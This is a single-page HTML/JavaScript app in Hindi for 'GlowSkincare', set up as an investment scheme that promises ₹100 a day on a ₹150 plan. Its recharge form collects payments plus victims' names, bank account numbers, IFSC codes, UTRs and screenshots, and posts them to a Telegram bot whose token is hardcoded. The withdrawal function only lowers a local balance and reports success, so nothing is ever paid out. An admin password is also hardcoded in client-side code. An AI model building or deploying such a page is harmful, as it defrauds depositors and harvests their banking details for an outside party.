<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GlowSkincare</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
    body { background-color: #0b0f19; color: #f3f4f6; display: flex; justify-content: center; min-height: 100vh; }
    .container { width: 100%; max-width: 420px; background-color: #111827; min-height: 100vh; display: flex; flex-direction: column; position: relative; border: 1px solid #1f2937; }
    .header { background: linear-gradient(180deg, #064e3b, #111827); padding: 16px; border-bottom: 1px solid #1f2937; }
    .card { background: #1f2937; padding: 14px; border-radius: 12px; margin-bottom: 12px; border: 1px solid #374151; }
    .input-field { width: 100%; padding: 10px; background: #0b0f19; border: 1px solid #374151; border-radius: 8px; color: #fff; margin-bottom: 10px; font-size: 13px; }
    .btn { width: 100%; padding: 11px; background: #059669; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 13px; }
    .btn-red { background: #dc2626; }
    .btn-gray { background: #374151; }
    .btn-opt { flex: 1; padding: 8px; font-size: 11px; border: 1px solid #374151; background: #0b0f19; color: #9ca3af; border-radius: 6px; cursor: pointer; }
    .btn-opt.selected { background: #059669; color: #fff; font-weight: bold; border-color: #059669; }
    .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 420px; background: #111827; border-top: 1px solid #1f2937; display: flex; justify-content: space-around; padding: 10px 0; z-index: 10; }
    .nav-btn { background: none; border: none; color: #9ca3af; font-size: 11px; cursor: pointer; }
    .nav-btn.active { color: #34d399; font-weight: bold; }
    .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; text-align: center; }
    .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; text-align: center; margin-bottom: 12px; }
  </style>
</head>
<body>
  <div class="container" id="app">
    <div style="padding: 24px; margin-top: auto; margin-bottom: auto;">
      <h2 style="text-align: center; color: #34d399; margin-bottom: 20px;">✨ GlowSkincare ✨</h2>
      <div style="display: flex; gap: 8px; margin-bottom: 16px;">
        <button id="tabLog" class="btn" style="flex:1;" onclick="setMode(false)">लॉगिन</button>
        <button id="tabReg" class="btn btn-gray" style="flex:1;" onclick="setMode(true)">रजिस्टर</button>
      </div>
      <form onsubmit="handleAuth(event)">
        <input type="text" id="phone" placeholder="मोबाइल नंबर" required class="input-field">
        <div id="regExtra" style="display: none;">
          <input type="text" id="uname" placeholder="यूजरनेम" class="input-field">
          <input type="password" id="wPass" placeholder="विथड्रॉल पासवर्ड (अलग)" required class="input-field">
        </div>
        <input type="password" id="lPass" placeholder="लॉगिन पासवर्ड" required class="input-field">
        <button type="submit" class="btn" id="submitBtn">लॉगिन करें</button>
      </form>
    </div>
  </div>

  <script>
    const ADMIN_PASS = "admin786";
    const TELEGRAM_BOT_TOKEN = "8854457716:AAEca3kyrRii_0EYrtbZ_62p0zXQlsbnNAE"; 
    const TELEGRAM_CHAT_ID = "7948579574";

    let isRegister = false;
    let currentSession = localStorage.getItem('glow_session') || null;
    let currentTab = 'home';
    let isAdmin = false;
    let selectedPayMethod = 'qr';
    let rechargeStep = 1;
    let tempRechargeAmt = 150;

    function getStorage(k, def) {
      try { return JSON.parse(localStorage.getItem(k)) || def; } catch(e) { return def; }
    }
    function setStorage(k, v) {
      localStorage.setItem(k, JSON.stringify(v));
    }

    function setMode(reg) {
      isRegister = reg;
      document.getElementById('regExtra').style.display = reg ? 'block' : 'none';
      document.getElementById('submitBtn').innerText = reg ? 'अकाउंट बनाएं' : 'लॉगिन करें';
      document.getElementById('tabLog').className = reg ? 'btn btn-gray' : 'btn';
      document.getElementById('tabReg').className = reg ? 'btn' : 'btn btn-gray';
    }

    function handleAuth(e) {
      e.preventDefault();
      const p = document.getElementById('phone').value.trim();
      const pass = document.getElementById('lPass').value.trim();

      if (p === "admin" && pass === ADMIN_PASS) {
        isAdmin = true;
        renderMain();
        return;
      }

      const users = getStorage('glow_users', {});
      if (isRegister) {
        const u = document.getElementById('uname').value.trim();
        const wp = document.getElementById('wPass').value.trim();
        if (users[p]) return alert('नंबर पहले से रजिस्टर्ड है!');
        users[p] = {
          phone: p, username: u || p, loginPass: pass, withdrawPass: wp,
          rechargeWallet: 0, withdrawWallet: 0, productIncome: 0,
          spinChances: 1, myPlans: []
        };
        setStorage('glow_users', users);
        currentSession = p;
        localStorage.setItem('glow_session', p);
        renderMain();
      } else {
        if (!users[p] || users[p].loginPass !== pass) return alert('गलत नंबर या पासवर्ड!');
        currentSession = p;
        localStorage.setItem('glow_session', p);
        renderMain();
      }
    }

    function setPayMethod(method) {
      selectedPayMethod = method;
      renderMain();
    }

    function proceedToPaymentDone() {
      const amtInput = document.getElementById('ramt');
      const amt = amtInput ? Number(amtInput.value) : 150;
      if (amt < 150) {
        alert('न्यूनतम रिचार्ज ₹150 है!');
        return;
      }
      tempRechargeAmt = amt;
      rechargeStep = 2;
      renderMain();
    }

    function renderMain() {
      const app = document.getElementById('app');
      if (isAdmin) {
        renderAdminView();
        return;
      }

      const users = getStorage('glow_users', {});
      const u = users[currentSession];
      if (!u) {
        currentSession = null;
        localStorage.removeItem('glow_session');
        location.reload();
        return;
      }

      let content = '';
      if (currentTab === 'home') {
        content = `
          <div class="header">
            <div style="display:flex; justify-content:space-between; align-items:center;">
              <div><b>${u.username}</b><p style="font-size:11px; color:#34d399;">ID: ${u.phone}</p></div>
              <button onclick="logout()" class="btn btn-red" style="width:auto; padding:5px 10px; font-size:11px;">लॉग आउट</button>
            </div>
            <div class="card grid-3" style="margin-top:12px;">
              <div><p style="font-size:10px; color:#9ca3af;">Income</p><b>₹${u.productIncome}</b></div>
              <div><p style="font-size:10px; color:#9ca3af;">Recharge</p><b>₹${u.rechargeWallet}</b></div>
              <div><p style="font-size:10px; color:#9ca3af;">Withdraw</p><b>₹${u.withdrawWallet}</b></div>
            </div>
          </div>
          <div style="padding:14px;">
            <div class="grid-4">
              <button onclick="currentTab='recharge';rechargeStep=1;renderMain()" class="card" style="padding:10px;">💳<br><span style="font-size:10px;">Recharge</span></button>
              <button onclick="currentTab='withdraw';renderMain()" class="card" style="padding:10px;">🏦<br><span style="font-size:10px;">Withdraw</span></button>
              <button onclick="currentTab='spin';renderMain()" class="card" style="padding:10px;">🎯<br><span style="font-size:10px;">Spin</span></button>
              <button onclick="currentTab='invest';renderMain()" class="card" style="padding:10px;">💎<br><span style="font-size:10px;">Invest</span></button>
            </div>
          </div>
        `;
      } else if (currentTab === 'invest') {
        content = `
          <div style="padding:16px;">
            <h3>इन्वेस्टमेंट प्लान</h3>
            <div class="card" style="margin-top:12px;">
              <h4 style="color:#34d399;">Starter Plan</h4>
              <p style="font-size:12px; margin:6px 0;">कीमत: ₹150 | दैनिक आय: ₹100 | अवधि: 49 दिन</p>
              <button onclick="buyPlan()" class="btn">₹150 में खरीदें</button>
            </div>
          </div>
        `;
      } else if (currentTab === 'recharge') {
        content = `
          <div style="padding:16px;">
            <h3>रिचार्ज (न्यूनतम ₹150)</h3>
            
            ${rechargeStep === 1 ? `
              <p style="font-size:11px; color:#9ca3af; margin:10px 0 6px 0;">पेमेंट माध्यम चुनें:</p>
              <div style="display:flex; gap:8px; margin-bottom:12px;">
                <button onclick="setPayMethod('qr')" class="btn-opt ${selectedPayMethod==='qr'?'selected':''}">📱 QR Code Pay</button>
                <button onclick="setPayMethod('bank')" class="btn-opt ${selectedPayMethod==='bank'?'selected':''}">🏦 Bank Account Pay</button>
              </div>

              <div style="margin-bottom:12px;">
                <label style="font-size:11px; color:#9ca3af; display:block; margin-bottom:4px;">रिचार्ज राशि (₹):</label>
                <input type="number" id="ramt" min="150" value="${tempRechargeAmt}" class="input-field">
              </div>

              ${selectedPayMethod === 'qr' ? `
                <div class="card" style="text-align:center;">
                  <p style="font-size:12px; margin-bottom:8px;">QR कोड स्कैन करके भुगतान करें:</p>
                  <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=upi://pay?pa=merchant@paytm&pn=GlowSkincare&cu=INR" style="width:140px; height:140px; border-radius:8px; margin:auto;">
                </div>
              ` : `
                <div class="card">
                  <p style="font-size:12px; color:#34d399; font-weight:bold; margin-bottom:6px;">बैंक ट्रांसफर विवरण:</p>
                  <p style="font-size:11px; color:#9ca3af;">A/C No: 38290100001234<br>IFSC: SBIN0001234<br>Name: GlowSkincare</p>
                </div>
              `}

              <button onclick="proceedToPaymentDone()" class="btn" style="margin-top:10px;">पेमेंट करने के लिए आगे बढ़ें</button>
            ` : `
              <div class="card" style="background:#064e3b; border-color:#059669; margin-bottom:12px;">
                <p style="font-size:12px;">चुनी गई राशि: <b>₹${tempRechargeAmt}</b></p>
                <button onclick="rechargeStep=1;renderMain()" style="background:none; border:none; color:#34d399; font-size:11px; cursor:pointer; text-decoration:underline; margin-top:4px;">← राशि या माध्यम बदलें</button>
              </div>

              <form onsubmit="handleRecSubmit(event)">
                <input type="text" id="rname" placeholder="अपना नाम / खाता धारक का नाम" required class="input-field">
                
                ${selectedPayMethod === 'bank' ? `
                  <input type="text" id="racc" placeholder="अपना बैंक खाता संख्या" required class="input-field">
                  <input type="text" id="rifsc" placeholder="बैंक IFSC कोड" required class="input-field">
                ` : ''}

                <input type="text" id="rutr" placeholder="12 अंकों का UTR नंबर" required class="input-field">
                
                <label style="font-size:11px; color:#9ca3af; display:block; margin-bottom:4px;">पेमेंट स्क्रीनशॉट अपलोड करें (अनिवार्य):</label>
                <input type="file" id="rfile" accept="image/*" required class="input-field">
                
                <button type="submit" class="btn">रिचार्ज सबमिट करें</button>
              </form>
            `}
          </div>
        `;
      } else if (currentTab === 'withdraw') {
        content = `
          <div style="padding:16px;">
            <h3>विथड्रॉल करें</h3>
            <p style="font-size:12px; color:#9ca3af; margin:8px 0;">बैलेंस: ₹${u.withdrawWallet}</p>
            <form onsubmit="handleWithSubmit(event)">
              <input type="number" id="wamt" min="200" placeholder="राशि (न्यूनतम ₹200)" required class="input-field">
              <input type="password" id="wpass" placeholder="विथड्रॉल पासवर्ड" required class="input-field">
              <button type="submit" class="btn">विथड्रॉ करें</button>
            </form>
          </div>
        `;
      } else if (currentTab === 'spin') {
        content = `
          <div style="padding:16px; text-align:center;">
            <h3>🎡 Lucky Spin</h3>
            <p style="font-size:12px; margin:10px 0;">बचे चांस: ${u.spinChances}</p>
            <button onclick="doSpin()" class="btn">स्पिन घुमाएं</button>
          </div>
        `;
      }

      app.innerHTML = `
        <div style="padding-bottom:60px;">${content}</div>
        <div class="bottom-nav">
          <button class="nav-btn ${currentTab==='home'?'active':''}" onclick="currentTab='home';renderMain()">🏠<br>Home</button>
          <button class="nav-btn ${currentTab==='invest'?'active':''}" onclick="currentTab='invest';renderMain()">💎<br>Invest</button>
          <button class="nav-btn ${currentTab==='recharge'?'active':''}" onclick="currentTab='recharge';rechargeStep=1;renderMain()">💳<br>Recharge</button>
        </div>
      `;
    }

    function buyPlan() {
      const users = getStorage('glow_users', {});
      const u = users[currentSession];
      if (u.rechargeWallet < 150) return alert('वॉलेट में बैलेंस कम है!');
      u.rechargeWallet -= 150;
      u.spinChances += 1;
      setStorage('glow_users', users);
      alert('प्लान एक्टिवेट हो गया!');
      renderMain();
    }

    function handleRecSubmit(e) {
      e.preventDefault();
      const amt = tempRechargeAmt;
      const name = document.getElementById('rname').value.trim();
      const acc = document.getElementById('racc') ? document.getElementById('racc').value.trim() : 'N/A (QR Pay)';
      const ifsc = document.getElementById('rifsc') ? document.getElementById('rifsc').value.trim() : 'N/A';
      const utr = document.getElementById('rutr').value.trim();
      const file = document.getElementById('rfile').files[0];

      const reader = new FileReader();
      reader.onload = function(evt) {
        const p = getStorage('glow_pending', []);
        const newReq = { 
          id: Date.now(), 
          phone: currentSession, 
          method: selectedPayMethod === 'qr' ? 'QR Code' : 'Bank Transfer',
          amt, 
          name, 
          acc, 
          ifsc, 
          utr, 
          img: evt.target.result 
        };
        p.push(newReq);
        setStorage('glow_pending', p);

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
          const textMsg = `🔔 नया रिचार्ज अनुरोध!\n📱 यूजर: ${currentSession}\n👤 नाम: ${name}\n💰 राशि: ₹${amt}\n🔢 UTR: ${utr}\n💳 माध्यम: ${selectedPayMethod}`;
          
          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMsg })
          }).catch(err => console.log(err));

          fetch(evt.target.result)
            .then(res => res.blob())
            .then(blob => {
              const formData = new FormData();
              formData.append('chat_id', TELEGRAM_CHAT_ID);
              formData.append('photo', blob, 'screenshot.jpg');
              formData.append('caption', `स्क्रीनशॉट - UTR: ${utr} (₹${amt})`);

              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
              }).catch(err => console.log(err));
            });
        }

        alert('रिचार्ज अनुरोध भेज दिया गया!');
        currentTab = 'home';
        rechargeStep = 1;
        renderMain();
      };
      reader.readAsDataURL(file);
    }

    function handleWithSubmit(e) {
      e.preventDefault();
      const amt = Number(document.getElementById('wamt').value);
      const pass = document.getElementById('wpass').value.trim();
      const users = getStorage('glow_users', {});
      const u = users[currentSession];

      if (pass !== u.withdrawPass) return alert('गलत विथड्रॉल पासवर्ड!');
      if (amt < 200 || amt > u.withdrawWallet) return alert('अमान्य राशि या अपर्याप्त बैलेंस!');

      u.withdrawWallet -= amt;
      setStorage('glow_users', users);
      alert('विथड्रॉल सफल रहा!');
      renderMain();
    }

    function doSpin() {
      const users = getStorage('glow_users', {});
      const u = users[currentSession];
      if (u.spinChances <= 0) return alert('कोई चांस नहीं बचा!');
      u.spinChances -= 1;
      const reward = [0, 10, 20, 50, 100][Math.floor(Math.random() * 5)];
      u.withdrawWallet += reward;
      setStorage('glow_users', users);
      alert(reward > 0 ? `आपने ₹${reward} जीते!` : 'कुछ नहीं निकला!');
      renderMain();
    }

    function logout() {
      currentSession = null;
      localStorage.removeItem('glow_session');
      location.reload();
    }

    function renderAdminView() {
      const p = getStorage('glow_pending', []);
      const h = getStorage('glow_approved_history', []);
      const r = getStorage('glow_rejected_history', []);
      const app = document.getElementById('app');

      let html = `
        <div style="padding:16px;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
            <h3>Admin Panel</h3>
            <button onclick="isAdmin=false;location.reload()" class="btn" style="width:auto; padding:5px 10px;">Exit</button>
          </div>
          <h4>पेंडिंग रिक्वेस्ट (${p.length})</h4>
      `;

      p.forEach(item => {
        html += `
          <div class="card" style="margin-top:8px;">
            <p>यूजर: ${item.phone} | नाम: ${item.name}</p>
            <p style="font-size:11px; color:#9ca3af;">माध्यम: <b>${item.method}</b></p>
            ${item.acc !== 'N/A (QR Pay)' ? `<p style="font-size:11px; color:#9ca3af;">खाता: ${item.acc} (${item.ifsc})</p>` : ''}
            <p style="color:#34d399;">राशि: ₹${item.amt} | UTR: ${item.utr}</p>
            <img src="${item.img}" style="width:80px; height:80px; object-fit:cover; margin:6px 0; border-radius:4px;">
            <div style="display:flex; gap:8px;">
              <button onclick="actionApprove(${item.id})" class="btn" style="flex:1;">Approve</button>
              <button onclick="actionDisapprove(${item.id})" class="btn btn-red" style="flex:1;">Disapprove</button>
            </div>
          </div>
        `;
      });

      html += `<h4 style="margin-top:16px; color:#34d399;">अप्रूव्ड लिस्ट (${h.length})</h4>`;
      h.forEach(item => {
        html += `<div class="card" style="font-size:11px; margin-top:6px;">${item.phone} - ₹${item.amt} (${item.method} | UTR: ${item.utr})</div>`;
      });

      html += `<h4 style="margin-top:16px; color:#f87171;">डिस्अप्रूव्ड लिस्ट (${r.length})</h4>`;
      r.forEach(item => {
        html += `<div class="card" style="font-size:11px; margin-top:6px;">${item.phone} - ₹${item.amt} (${item.method} | UTR: ${item.utr})</div>`;
      });

      html += `</div>`;
      app.innerHTML = html;
    }

    function actionApprove(id) {
      if (!confirm("क्या आप वाकई इस रिचार्ज को अप्रूव करना चाहते हैं?")) return;
      let p = getStorage('glow_pending', []);
      const req = p.find(x => x.id === id);
      if (!req) return;

      const users = getStorage('glow_users', {});
      if (users[req.phone]) users[req.phone].rechargeWallet += req.amt;
      setStorage('glow_users', users);

      let h = getStorage('glow_approved_history', []);
      h.unshift(req);
      setStorage('glow_approved_history', h);

      setStorage('glow_pending', p.filter(x => x.id !== id));
      renderAdminView();
    }

    function actionDisapprove(id) {
      if (!confirm("क्या आप वाकई इस रिचार्ज को डिस्अप्रूव करना चाहते हैं?")) return;
      let p = getStorage('glow_pending', []);
      const req = p.find(x => x.id === id);
      if (!req) return;

      let r = getStorage('glow_rejected_history', []);
      r.unshift(req);
      setStorage('glow_rejected_history', r);

      setStorage('glow_pending', p.filter(x => x.id !== id));
      renderAdminView();
    }

    if (currentSession) renderMain();
  </script>
</body>
</html>
